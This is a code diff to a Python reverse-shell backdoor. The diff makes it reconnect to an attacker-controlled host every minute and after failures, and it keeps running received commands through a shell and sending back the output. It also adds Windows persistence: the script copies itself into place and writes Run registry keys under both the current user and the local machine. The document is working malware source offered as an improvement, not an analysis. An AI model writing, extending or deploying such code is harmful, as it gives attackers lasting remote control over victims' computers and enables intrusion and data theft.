@@ -22,21 +22,45 @@ def reverse_shell():
             s.connect((ATTACKER_IP, ATTACKER_PORT))
             print("Connected to the attacker.")
 
+            # Record the start time to manage reconnection intervals
+            start_time = time.time()
+
             # If connected, handle commands
             while True:
-                command = s.recv(1024).decode('utf-8')
-                if command.lower() == 'exit':
-                    break
-                result = subprocess.run(command, shell=True, capture_output=True, text=True)
-                output = result.stdout + result.stderr
-                s.send(output.encode('utf-8'))
+                try:
+                    # Check if a minute has passed since last reconnect
+                    current_time = time.time()
+                    if current_time - start_time >= 60:  # 60 seconds = 1 minute
+                        print("Reconnecting due to timeout...")
+                        break  # Break out to reconnect
+
+                    # Receive command from the attacker
+                    command = s.recv(1024).decode('utf-8')
+
+                    if not command:
+                        print("Connection lost. Reconnecting...")
+                        break  # Exit to reconnect
+
+                    if command.lower() == 'exit':
+                        print("Exit command received. Disconnecting...")
+                        return  # Exit the function to stop the script
+
+                    # Execute command and send the output
+                    result = subprocess.run(command, shell=True, capture_output=True, text=True)
+                    output = result.stdout + result.stderr
+                    s.send(output.encode('utf-8'))
+
+                except Exception as e:
+                    print(f"Error while processing command: {e}")
+                    break  # Exit to reconnect
 
             s.close()
-            break  # Exit while loop if connection is closed properly
+            print("Disconnected. Reconnecting in 10 seconds...")
+            time.sleep(10)  # Wait before reconnecting
 
         except (socket.error, ConnectionRefusedError) as e:
             print(f"Connection failed: {e}. Retrying in 10 seconds...")
-            time.sleep(10)  # Wait for 10 seconds before retrying
+            time.sleep(10)  # Wait before retrying
 
 
 def add_to_startup():
@@ -54,10 +78,26 @@ def add_to_startup():
         if exe_path != target_exe_path:
             shutil.copy(exe_path, target_exe_path)
 
-        # Open the registry key for modification
-        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
-        reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, target_exe_path)
-        reg.CloseKey(key)
+        # Add to user startup
+        try:
+            key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                              reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, target_exe_path)
+            reg.CloseKey(key)
+            print("Successfully added to user startup.")
+        except Exception as e:
+            print(f"Failed to add to user startup: {e}")
+
+        # Add to machine startup
+        try:
+            key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run", 0,
+                              reg.KEY_SET_VALUE)
+            reg.SetValueEx(key, ENTRY_NAME, 0, reg.REG_SZ, exe_path)
+            reg.CloseKey(key)
+            print("Successfully added to machine startup.")
+        except Exception as e:
+            print(f"Failed to add to machine startup: {e}")
+
     except Exception as e:
         print(f"Failed to add to startup: {e}")
 
